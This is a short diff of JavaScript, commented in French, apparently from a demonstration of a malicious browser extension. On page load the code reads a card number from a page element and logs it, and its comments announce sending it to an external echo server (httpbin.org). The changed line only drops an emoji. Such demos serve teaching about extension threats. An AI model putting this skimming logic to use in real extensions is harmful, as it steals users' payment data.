@@ -7,7 +7,7 @@ window.addEventListener('load', () => {
     if (secretBox) {
         // extrait le texte (ici numéro de carte)
         const secretText = secretBox.innerText;
-        console.log("😈 EXTENSION MALVEILLANTE : J'ai trouvé une donnée sensible ->", secretText);
+        console.log("EXTENSION MALVEILLANTE : J'ai trouvé une donnée sensible ->", secretText);
 
         // prépare une requête pour envoyer cette donnée vers un serveur externe
         // On utilise httpbin.org qui retourne simplement ce qu'on lui envoie
